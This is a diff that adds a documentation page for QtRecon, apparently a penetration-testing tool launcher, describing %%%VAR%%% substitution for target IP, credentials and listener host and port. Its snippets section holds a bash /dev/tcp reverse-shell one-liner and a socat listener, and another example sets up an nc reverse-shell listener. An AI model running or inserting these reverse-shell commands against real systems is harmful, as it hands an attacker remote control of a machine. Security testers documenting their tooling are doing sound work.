@@ -1,0 +1,385 @@
+---
+title: Variables
+description: User variables and replacement syntax for dynamic tool arguments
+---
+
+QtRecon supports variable substitution in tool arguments, allowing you to create dynamic commands that adapt to the current target, credentials, and environment.
+
+## Variable syntax
+
+Variables use the syntax `%%%VARIABLE_NAME%%%` (three percent signs on each side):
+
+```json
+"args": ["-u", "%%%USERNAME%%%", "-p", "%%%PASSWORD%%%", "%%%IP%%%"]
+```
+
+When the tool is launched, QtRecon replaces these placeholders with actual values.
+
+## Built-in variables
+
+QtRecon provides several built-in variables that are automatically populated:
+
+### Network variables
+
+<ParamField path="%%%IP%%%" type="string">
+  Target IP address
+</ParamField>
+
+<ParamField path="%%%PORT%%%" type="string">
+  Target port number
+</ParamField>
+
+<ParamField path="%%%PROTO%%%" type="string">
+  Protocol for the service (typically "http" or "https" for web services)
+</ParamField>
+
+<ParamField path="%%%LHOST%%%" type="string">
+  Local host IP address (your attacking machine). Determined from preferred_interfaces in user_prefs
+</ParamField>
+
+<ParamField path="%%%LPORT%%%" type="string">
+  Local port for reverse shells/listeners. Uses preferred_lport from user_prefs
+</ParamField>
+
+### Authentication variables
+
+<ParamField path="%%%USERNAME%%%" type="string">
+  Username (must be set by user or from credentials database)
+</ParamField>
+
+<ParamField path="%%%PASSWORD%%%" type="string">
+  Password (must be set by user or from credentials database)
+</ParamField>
+
+<ParamField path="%%%DOMAIN%%%" type="string">
+  Domain name for Active Directory environments
+</ParamField>
+
+### Other variables
+
+<ParamField path="%%%OUTPUT%%%" type="string">
+  Output file path (used internally by QtRecon for certain operations)
+</ParamField>
+
+## User-defined variables
+
+The `user_variables` section allows you to define custom variables:
+
+```json
+"user_variables": {
+    "XFREERDP_KEYBOARD": "0x0000040C"
+}
+```
+
+Use them in tool arguments:
+
+```json
+"xfreerdp": {
+    "name": "xfreerdp",
+    "binary": "/usr/bin/xfreerdp",
+    "args": [
+        "/v:%%%IP%%%",
+        "/kbd:%%%XFREERDP_KEYBOARD%%%"
+    ]
+}
+```
+
+<Note>
+User-defined variables follow the same `%%%VAR%%%` syntax as built-in variables.
+</Note>
+
+## Examples
+
+### Basic network tool
+
+```json
+"netcat": {
+    "binary": "/usr/bin/ncat",
+    "args": ["-nv", "%%%IP%%%", "%%%PORT%%%"]
+}
+```
+
+Result: `ncat -nv 192.168.1.10 80`
+
+### Web application scanner
+
+```json
+"nikto": {
+    "binary": "/usr/bin/nikto",
+    "args": ["--host", "%%%IP%%%", "--port", "%%%PORT%%%"]
+}
+```
+
+Result: `nikto --host 192.168.1.10 --port 443`
+
+### URL construction
+
+```json
+"firefox": {
+    "binary": "/usr/bin/firefox",
+    "args": ["-P", "tmp", "http://%%%IP%%%:%%%PORT%%%/"]
+}
+```
+
+Result: `firefox -P tmp http://192.168.1.10:8080/`
+
+### Protocol-aware scanning
+
+```json
+"feroxbuster": {
+    "binary": "/usr/bin/feroxbuster",
+    "args": [
+        "--url", "%%%PROTO%%%://%%%IP%%%:%%%PORT%%%/",
+        "-w", "/usr/share/wordlists/common.txt"
+    ]
+}
+```
+
+Result: `feroxbuster --url https://192.168.1.10:443/ -w /usr/share/wordlists/common.txt`
+
+### Authenticated tools
+
+```json
+"ssh": {
+    "binary": "/usr/bin/ssh",
+    "args": [
+        "-o", "UserKnownHostsFile=/dev/null",
+        "%%%USERNAME%%%@%%%IP%%%"
+    ]
+}
+```
+
+Result: `ssh -o UserKnownHostsFile=/dev/null admin@192.168.1.10`
+
+### Active Directory enumeration
+
+```json
+"xfreerdp": {
+    "binary": "/usr/bin/xfreerdp",
+    "args": [
+        "/v:%%%IP%%%",
+        "/d:%%%DOMAIN%%%",
+        "/u:%%%USERNAME%%%",
+        "/p:%%%PASSWORD%%%"
+    ]
+}
+```
+
+Result: `xfreerdp /v:192.168.1.10 /d:CORP /u:admin /p:Password123`
+
+### Custom script with multiple variables
+
+```json
+"smb_script_authenticated": {
+    "binary": "/bin/bash",
+    "args": [
+        "scripts/smb.sh",
+        "%%%IP%%%",
+        "%%%DOMAIN%%%",
+        "%%%USERNAME%%%",
+        "%%%PASSWORD%%%"
+    ]
+}
+```
+
+Result: `bash scripts/smb.sh 192.168.1.10 CORP admin Password123`
+
+### Reverse shell listener
+
+```json
+"reverse_shell_listener": {
+    "binary": "/usr/bin/nc",
+    "args": ["-lvnp", "%%%LPORT%%%"]
+}
+```
+
+Result: `nc -lvnp 8444` (using preferred_lport from user_prefs)
+
+## User preferences for built-in variables
+
+Some built-in variables are configured in the `user_prefs` section:
+
+```json
+"user_prefs": {
+    "preferred_interfaces": ["tun0", "vpn0", "eth0"],
+    "preferred_lport": 8444
+}
+```
+
+<ParamField path="preferred_interfaces" type="array">
+  List of network interfaces in priority order. QtRecon uses the first available interface to populate %%%LHOST%%%
+</ParamField>
+
+<ParamField path="preferred_lport" type="integer">
+  Default local port for %%%LPORT%%% variable
+</ParamField>
+
+<Tip>
+For VPN-based penetration testing, put your VPN interface (e.g., "tun0") first in preferred_interfaces to ensure reverse shells connect to the correct IP.
+</Tip>
+
+## Common user-defined variables
+
+### Keyboard layout for RDP
+
+```json
+"user_variables": {
+    "XFREERDP_KEYBOARD": "0x0000040C"  // French keyboard
+}
+```
+
+Common keyboard layout codes:
+- `0x00000409` - US English
+- `0x00000809` - UK English
+- `0x0000040C` - French
+- `0x00000407` - German
+
+### Wordlist paths
+
+```json
+"user_variables": {
+    "WORDLIST_COMMON": "/usr/share/wordlists/common.txt",
+    "WORDLIST_USERS": "/usr/share/wordlists/users.txt"
+}
+```
+
+### Custom payload paths
+
+```json
+"user_variables": {
+    "PAYLOAD_DIR": "/home/user/payloads",
+    "SHELL_SCRIPT": "/home/user/payloads/shell.sh"
+}
+```
+
+### Environment-specific settings
+
+```json
+"user_variables": {
+    "PROXY_HOST": "127.0.0.1",
+    "PROXY_PORT": "8080",
+    "USER_AGENT": "Mozilla/5.0 Custom Scanner"
+}
+```
+
+## Setting variables at runtime
+
+Some variables (like `%%%USERNAME%%%` and `%%%PASSWORD%%%`) can be set through QtRecon's UI:
+
+1. Right-click on a host or port
+2. Select "Set variables"
+3. Enter values for username, password, domain, etc.
+4. These values persist for the current session
+
+<Note>
+Credentials can also be stored in QtRecon's credentials database for reuse across multiple targets.
+</Note>
+
+## Variable precedence
+
+ When multiple sources provide the same variable:
+
+1. **Runtime values** (set via UI) - highest priority
+2. **User-defined variables** (from conf.json)
+3. **Built-in variables** (from QtRecon)
+4. **Empty string** (if no value is available) - lowest priority
+
+## Snippets and variables
+
+Variables work in the `snippets` section as well:
+
+```json
+"snippets": {
+    "Reverse shells": [
+        "Launching the reverse shell",
+        [
+            "socat -dd tcp-listen:%%%LPORT%%%,reuseaddr,fork,bind=%%%LHOST%%% stdio"
+        ],
+        "Bash TCP",
+        [
+            "bash -i >& /dev/tcp/%%%LHOST%%%/%%%LPORT%%% 0>&1"
+        ]
+    ]
+}
+```
+
+<Tip>
+Snippets provide ready-to-use commands with variables already in place. Copy them to your clipboard and variables will be substituted automatically.
+</Tip>
+
+## Best practices
+
+### 1. Use descriptive variable names
+
+```json
+// Good
+"XFREERDP_KEYBOARD": "0x0000040C"
+
+// Bad
+"KB": "0x0000040C"
+```
+
+### 2. Document custom variables
+
+Add comments in your configuration (note: JSON doesn't support comments, so document separately):
+
+```json
+"user_variables": {
+    "XFREERDP_KEYBOARD": "0x0000040C",  // French AZERTY keyboard layout
+    "WORDLIST_WEB": "/usr/share/wordlists/web-content.txt"  // Main wordlist for web enumeration
+}
+```
+
+### 3. Validate paths in variables
+
+Ensure file paths in variables exist:
+
+```bash
+ls -l /usr/share/wordlists/common.txt
+```
+
+### 4. Consider security
+
+Avoid storing sensitive data in user_variables:
+
+```json
+// Bad - credentials in config
+"user_variables": {
+    "DEFAULT_PASSWORD": "Admin123!"
+}
+
+// Good - use runtime credential entry
+"args": ["%%%USERNAME%%%", "%%%PASSWORD%%%"]
+```
+
+### 5. Test variable substitution
+
+Before using a tool in production:
+
+1. Enable `edit_before_launch` for the tool
+2. Run it once to verify variables are substituted correctly
+3. Disable `edit_before_launch` if everything works
+
+## Troubleshooting
+
+### Variable not substituted
+
+- Ensure the variable name is spelled correctly
+- Check that the variable uses `%%%` (three percent signs) on both sides
+- Verify the variable exists in `user_variables` or is a valid built-in
+
+### Empty variable value
+
+- For authentication variables, ensure they're set via UI or credentials database
+- For LHOST, check that one of your preferred_interfaces exists and is up
+- For custom variables, verify they're defined in `user_variables`
+
+### Wrong LHOST IP
+
+- Check the order of interfaces in `preferred_interfaces`
+- Verify your VPN/tunnel interface is first in the list
+- Ensure the interface is actually active:
+
+```bash
+ip addr show tun0
+```
